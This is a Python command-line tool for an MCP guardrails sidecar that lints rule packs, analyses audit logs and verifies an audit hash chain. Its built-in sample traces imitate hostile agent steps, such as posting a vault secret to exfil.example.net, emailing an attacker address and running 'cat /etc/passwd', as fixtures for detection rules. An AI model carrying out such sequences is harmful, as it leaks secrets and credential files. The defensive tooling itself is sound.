#!/usr/bin/env python3
"""``guardrail_ctl`` — operator CLI for the mcp-guardrails sidecar.

Zero-dependency (stdlib + the ``guardrails`` package itself), argparse-based.

Subcommands
-----------

``rules lint [--path FILE | --module DOTTED]``
    Load an Invariant rule pack (same resolution as the runtime loader:
    explicit ``--path`` / ``--module`` > ``INVARIANT_RULES_PATH`` /
    ``INVARIANT_RULES_MODULE`` env > the bundled default pack), validate
    the structure of every rule (empty steps, unknown fields, negate-step
    placement, threshold legality), then dry-run each rule against a set of
    built-in sample traces and report whether it fired. Exit code 0 = pack
    is valid; 1 = invalid (problems listed on stderr).

``decision replay AUDIT.jsonl``
    Offline analysis of the JSONL audit log (``record_decision`` lines):
    outcome distribution, per-scanner / per-rule drill-down, and
    request/response pairing by ``exchange_id``. Purely offline — the
    engine is never reconstructed. Exit code 0 = analysed; 1 = unreadable
    or empty input.

``audit verify AUDIT.jsonl``
    Verify the tamper-evident audit hash chain (A-P0-3,
    ``AUDIT_HASH_CHAIN=1``): every line's ``prev_hash`` must equal the
    SHA-256/16 prefix of the previous raw line, and its ``line_hash`` must
    match the recomputed digest of the line minus that field. Reports the
    FIRST broken line number (1-based) and what failed. Lines without
    chain fields (legacy / ``AUDIT_HASH_CHAIN=0`` files) are reported as
    unchained and skipped, not misreported as a break. Exit code 0 =
    chain intact (or nothing chained to verify); 1 = unreadable input or
    a break.
"""

from __future__ import annotations

import argparse
import dataclasses
import json
import sys
from collections import Counter
from collections.abc import Sequence
from typing import Any

# ---------------------------------------------------------------------------
# rules lint
# ---------------------------------------------------------------------------

# Fields each rule class legitimately exposes (beyond ``name`` /
# ``description``). Anything else on the instance is reported as an unknown
# field — usually a typo'd constructor kwarg that a dataclass would have
# rejected, but hand-rolled duck-typed rules can carry silently.
_KNOWN_RULE_FIELDS: dict[str, set[str]] = {
    "ToxicFlowRule": {"name", "description", "steps"},
    "LoopRule": {"name", "description", "threshold"},
    "RateLimitRule": {"name", "description", "tool", "window_s", "max_calls"},
    "AggregateRule": {
        "name",
        "description",
        "tool",
        "field",
        "max_total",
        "window_s",
        "cast",
    },
}
_KNOWN_STEP_FIELDS = {"tool", "args", "args_any", "negate"}


def _validate_rule(rule: Any, problems: list[str]) -> None:
    """Append human-readable structural problems for one rule."""
    name = getattr(rule, "name", None)
    label = name if isinstance(name, str) and name else repr(rule)
    if not isinstance(name, str) or not name:
        problems.append(f"rule {rule!r}: missing/invalid 'name'")
    if not callable(getattr(rule, "match", None)):
        problems.append(f"rule {label!r}: no callable match(trace)")

    cls = type(rule).__name__
    known = _KNOWN_RULE_FIELDS.get(cls)
    if known is not None:
        # Unknown init fields on dataclass rules: any public attribute that
        # is not a known field and not a compiled internal (_-prefixed).
        for f in dataclasses.fields(rule) if dataclasses.is_dataclass(rule) else ():
            if not f.init:
                continue
            if f.name not in known:
                problems.append(f"rule {label!r}: unknown field {f.name!r}")
    else:
        problems.append(
            f"rule {label!r}: unrecognised rule class {cls!r} "
            "(structural checks limited to name/match)"
        )
        return

    if cls == "ToxicFlowRule":
        steps = getattr(rule, "steps", None)
        if not steps:
            problems.append(f"rule {label!r}: ToxicFlowRule with no steps")
            return
        for i, step in enumerate(steps):
            where = f"rule {label!r} step[{i}]"
            if not hasattr(step, "tool"):
                problems.append(f"{where}: not a FlowStep (no 'tool' matcher)")
                continue
            if dataclasses.is_dataclass(step):
                for f in dataclasses.fields(step):
                    if f.init and f.name not in _KNOWN_STEP_FIELDS:
                        problems.append(f"{where}: unknown field {f.name!r}")
        positive = [s for s in steps if not getattr(s, "negate", False)]
        if not positive:
            problems.append(f"rule {label!r}: no positive steps — rule can never fire")
        # A trailing run of negate steps is legal (armed until completion)
        # but a negate step BEFORE the first positive step only guards the
        # window head — flag leading negates as a common authoring mistake.
        if getattr(steps[0], "negate", False):
            problems.append(
                f"rule {label!r}: step[0] is a negate guard — guards only arm "
                "AFTER a positive step matches; a leading negate is usually a mistake"
            )
    elif cls == "LoopRule":
        threshold = getattr(rule, "threshold", None)
        if not isinstance(threshold, int) or threshold < 2:
            problems.append(f"rule {label!r}: LoopRule threshold must be an int >= 2")
    elif cls == "RateLimitRule":
        if getattr(rule, "window_s", 0) <= 0:
            problems.append(f"rule {label!r}: RateLimitRule window_s must be > 0")
        if getattr(rule, "max_calls", 0) < 1:
            problems.append(f"rule {label!r}: RateLimitRule max_calls must be >= 1")
    elif cls == "AggregateRule":
        if not getattr(rule, "field", ""):
            problems.append(f"rule {label!r}: AggregateRule field must be non-empty")
        if getattr(rule, "max_total", 0) <= 0:
            problems.append(f"rule {label!r}: AggregateRule max_total must be > 0")
        if getattr(rule, "window_s", 0) <= 0:
            problems.append(f"rule {label!r}: AggregateRule window_s must be > 0")


def _sample_traces() -> list[tuple[str, list[Any]]]:
    """Built-in dry-run traces covering the default pack's signatures."""
    from guardrails.invariant import TraceEntry

    return [
        ("empty", []),
        (
            "benign-plan",
            [
                TraceEntry("inbox_read", {}),
                TraceEntry("fs_read", {"path": "/tmp/notes.txt"}),
                TraceEntry("inbox_read", {}),
            ],
        ),
        (
            "inbox-to-external-email",
            [
                TraceEntry("inbox_read", {}),
                TraceEntry("email_send", {"to": "attacker@evil.example"}),
            ],
        ),
        (
            "secret-read-then-exfil",
            [
                TraceEntry("vault_read", {"key": "db"}),
                TraceEntry("http_post", {"url": "https://exfil.example.net/c"}),
            ],
        ),
        (
            "shell-then-k8s-apply",
            [
                TraceEntry("shell_exec", {"cmd": "cat /etc/passwd"}),
                TraceEntry("k8s_apply", {"manifest": "cluster-admin binding"}),
            ],
        ),
        (
            "retry-loop",
            [TraceEntry("fs_write", {"path": "/etc/x"})] * 3,
        ),
        (
            "rate-spray",
            [TraceEntry("fs_read", {"path": f"/f/{i}"}) for i in range(31)],
        ),
    ]


def cmd_rules_lint(args: argparse.Namespace) -> int:
    try:
        from guardrails.rules import load_rules
    except ImportError:
        print(
            "error: the 'guardrails' package is not importable — run from the "
            "repo root or install it (pip install -e .)",
            file=sys.stderr,
        )
        return 1

    source = args.path or args.module or "(env/default resolution)"
    try:
        rules = load_rules(path=args.path, module=args.module)
    except Exception as exc:
        print(f"error: failed to load rule pack from {source}: {exc}", file=sys.stderr)
        return 1

    problems: list[str] = []
    seen_names: set[str] = set()
    for rule in rules:
        name = getattr(rule, "name", "")
        if name in seen_names:
            problems.append(f"duplicate rule name {name!r}")
        seen_names.add(name)
        _validate_rule(rule, problems)

    print(f"rule pack: {source}")
    print(f"loaded {len(rules)} rule(s)")
    for rule in rules:
        print(f"  - {type(rule).__name__}: {getattr(rule, 'name', rule)!r}")

    if problems:
        print("\nproblems:", file=sys.stderr)
        for p in problems:
            print(f"  ✗ {p}", file=sys.stderr)
        return 1

    # Dry-run every rule against the built-in sample traces.
    print("\ndry-run against built-in sample traces:")
    for trace_name, trace in _sample_traces():
        fired: list[str] = []
        for rule in rules:
            try:
                hit = rule.match(trace)
            except Exception as exc:
                print(f"  ! {rule.name!r} raised on trace {trace_name!r}: {exc}")
                continue
            if hit:
                fired.append(str(rule.name))
        marker = ", ".join(fired) if fired else "(no hit)"
        print(f"  trace {trace_name!r}: {marker}")
    print("\npack is valid")
    return 0


# ---------------------------------------------------------------------------
# decision replay
# ---------------------------------------------------------------------------


def _load_audit(path: str) -> tuple[list[dict[str, Any]], int]:
    """Parse JSONL, skipping blank/malformed lines. Returns (records, bad)."""
    records: list[dict[str, Any]] = []
    bad = 0
    with open(path, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                bad += 1
                continue
            if isinstance(obj, dict):
                records.append(obj)
            else:
                bad += 1
    return records, bad


def cmd_decision_replay(args: argparse.Namespace) -> int:
    try:
        records, bad = _load_audit(args.audit_jsonl)
    except OSError as exc:
        print(f"error: cannot read {args.audit_jsonl}: {exc}", file=sys.stderr)
        return 1

    decisions = [r for r in records if "outcome" in r and "phase" in r]
    other = len(records) - len(decisions)
    if not decisions:
        print(
            f"error: no decision records found in {args.audit_jsonl} "
            f"({len(records)} JSON line(s) parsed, {bad} malformed)",
            file=sys.stderr,
        )
        return 1

    print(f"audit file: {args.audit_jsonl}")
    print(
        f"lines: {len(records)} parsed ({bad} malformed skipped), "
        f"{len(decisions)} decision record(s), {other} other event(s)"
    )

    ts = [r.get("ts_ms") or r.get("ts") for r in decisions if r.get("ts") or r.get("ts_ms")]
    if ts:
        span = max(ts) - min(ts)
        print(f"time span: {span / 1000.0:.1f}s" if span < 1e6 else f"time span: {span:.0f}s")

    print("\noutcome distribution:")
    outcomes = Counter(str(r.get("outcome", "?")) for r in decisions)
    for outcome, n in outcomes.most_common():
        print(f"  {outcome:<14} {n:>6}  ({100.0 * n / len(decisions):5.1f}%)")

    print("\nby phase:")
    for phase, n in Counter(str(r.get("phase", "?")) for r in decisions).most_common():
        print(f"  {phase:<14} {n:>6}")

    # Per-scanner drill-down from the per-record scanner breakdown.
    print("\nscanner outcomes (drill-down):")
    scanner_outcomes: Counter[tuple[str, str]] = Counter()
    for r in decisions:
        for s in r.get("scanners") or []:
            if isinstance(s, dict):
                scanner_outcomes[(str(s.get("scanner", "?")), str(s.get("outcome", "?")))] += 1
    for (scanner, outcome), n in sorted(scanner_outcomes.items()):
        print(f"  {scanner:<40} {outcome:<14} {n:>6}")

    # Invariant rule hits (scanner names look like "invariant:<rule>").
    rule_hits = {
        scanner.split(":", 1)[1]: n
        for (scanner, outcome), n in scanner_outcomes.items()
        if scanner.startswith("invariant:") and outcome == "block"
    }
    if rule_hits:
        print("\ninvariant rule hits:")
        for rule, n in sorted(rule_hits.items(), key=lambda kv: -kv[1]):
            print(f"  {rule:<40} {n:>6}")

    # exchange_id request/response pairing.
    by_exchange: dict[str, list[dict[str, Any]]] = {}
    for r in decisions:
        ex = str(r.get("exchange_id") or "")
        if ex:
            by_exchange.setdefault(ex, []).append(r)
    paired = sum(1 for v in by_exchange.values() if len(v) >= 2)
    unpaired_req = sum(
        1 for v in by_exchange.values() if len(v) == 1 and v[0].get("phase") == "request"
    )
    unpaired_resp = sum(
        1 for v in by_exchange.values() if len(v) == 1 and v[0].get("phase") == "response"
    )
    print("\nexchange_id correlation:")
    print(f"  distinct exchange_ids : {len(by_exchange)}")
    print(f"  request+response pairs: {paired}")
    print(f"  request-only          : {unpaired_req}")
    print(f"  response-only         : {unpaired_resp}")

    if args.deny_detail:
        print("\ndeny / human_review detail:")
        for r in decisions:
            if r.get("outcome") in ("deny", "human_review"):
                print(
                    f"  [{r.get('phase', '?')}] {r.get('outcome')} "
                    f"tool={r.get('tool', '')!r} ref={r.get('ref', '')} "
                    f"exchange_id={r.get('exchange_id', '')} reason={r.get('reason', '')}"
                )
    return 0


# ---------------------------------------------------------------------------
# audit verify — hash-chain integrity check (A-P0-3)
# ---------------------------------------------------------------------------


def cmd_audit_verify(args: argparse.Namespace) -> int:
    """Chain-walk an audit JSONL and report the first broken line.

    For each line N: ``prev_hash`` must equal the 16-hex SHA-256 prefix of
    line N-1's raw text (``AUDIT_CHAIN_GENESIS`` for line 1), and
    ``line_hash`` must equal the prefix recomputed from the line's JSON
    minus the ``line_hash`` field. A tampered, dropped or reordered line
    breaks the chain at itself or its successor; the first break localises
    the tamper.
    """
    try:
        from guardrails.otel import AUDIT_CHAIN_GENESIS, _sha256_16
    except ImportError:
        print(
            "error: the 'guardrails' package is not importable — run from the "
            "repo root or install it (pip install -e .)",
            file=sys.stderr,
        )
        return 1

    try:
        with open(args.audit_jsonl, encoding="utf-8") as fh:
            raw_lines = [ln.rstrip("\n") for ln in fh if ln.strip()]
    except OSError as exc:
        print(f"error: cannot read {args.audit_jsonl}: {exc}", file=sys.stderr)
        return 1
    if not raw_lines:
        print(f"error: {args.audit_jsonl} is empty", file=sys.stderr)
        return 1

    prev_raw: str | None = None
    checked = 0
    unchained = 0
    for lineno, raw in enumerate(raw_lines, start=1):
        try:
            obj = json.loads(raw)
        except json.JSONDecodeError:
            print(f"BROKEN at line {lineno}: malformed JSON", file=sys.stderr)
            return 1
        if not isinstance(obj, dict) or "prev_hash" not in obj or "line_hash" not in obj:
            # Legacy/pre-chain line (written before the hash chain existed or
            # with AUDIT_HASH_CHAIN=0). Not a chain break: skip it, but do NOT
            # advance the chain cursor — the next chained line is still
            # verified against the previous CHAINED line, so stripping the
            # chain fields off a previously chained line still surfaces as a
            # prev_hash mismatch at its successor.
            unchained += 1
            continue
        expected_prev = AUDIT_CHAIN_GENESIS if prev_raw is None else _sha256_16(prev_raw)
        if obj["prev_hash"] != expected_prev:
            print(
                f"BROKEN at line {lineno}: prev_hash mismatch "
                f"(expected {expected_prev}, got {obj['prev_hash']}) — "
                "an earlier line was edited, dropped or reordered",
                file=sys.stderr,
            )
            return 1
        body = json.dumps(
            {k: v for k, v in obj.items() if k != "line_hash"}, default=str, sort_keys=True
        )
        expected_line = _sha256_16(body)
        if obj["line_hash"] != expected_line:
            print(
                f"BROKEN at line {lineno}: line_hash mismatch "
                f"(expected {expected_line}, got {obj['line_hash']}) — "
                "this line's content was tampered",
                file=sys.stderr,
            )
            return 1
        prev_raw = raw
        checked += 1

    print(f"audit file: {args.audit_jsonl}")
    if checked == 0:
        print(
            f"no hash-chained lines ({unchained} legacy/unchained line(s)) — "
            "written before the hash chain existed or with AUDIT_HASH_CHAIN=0; "
            "nothing to verify"
        )
        return 0
    suffix = f", {unchained} legacy/unchained line(s) skipped" if unchained else ""
    print(f"hash chain OK: {checked} line(s) verified, no breaks{suffix}")
    return 0


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="guardrail_ctl",
        description="Operator CLI for the mcp-guardrails sidecar (offline tooling).",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    rules_p = sub.add_parser("rules", help="rule-pack tooling")
    rules_sub = rules_p.add_subparsers(dest="rules_command", required=True)
    lint = rules_sub.add_parser(
        "lint", help="validate a rule pack and dry-run it against sample traces"
    )
    src = lint.add_mutually_exclusive_group()
    src.add_argument("--path", help="rule pack file (e.g. rules.policy)")
    src.add_argument("--module", help="dotted module path (e.g. guardrails.rules.default)")
    lint.set_defaults(func=cmd_rules_lint)

    dec_p = sub.add_parser("decision", help="decision / audit-log tooling")
    dec_sub = dec_p.add_subparsers(dest="decision_command", required=True)
    replay = dec_sub.add_parser(
        "replay", help="offline analysis of an audit JSONL (record_decision lines)"
    )
    replay.add_argument("audit_jsonl", help="path to the audit JSONL file")
    replay.add_argument(
        "--deny-detail",
        action="store_true",
        help="list every deny / human_review record with ref + reason",
    )
    replay.set_defaults(func=cmd_decision_replay)

    audit_p = sub.add_parser("audit", help="audit-log integrity tooling")
    audit_sub = audit_p.add_subparsers(dest="audit_command", required=True)
    verify = audit_sub.add_parser(
        "verify", help="verify the audit hash chain (prev_hash/line_hash)"
    )
    verify.add_argument("audit_jsonl", help="path to the audit JSONL file")
    verify.set_defaults(func=cmd_audit_verify)
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    return int(args.func(args))


if __name__ == "__main__":
    raise SystemExit(main())
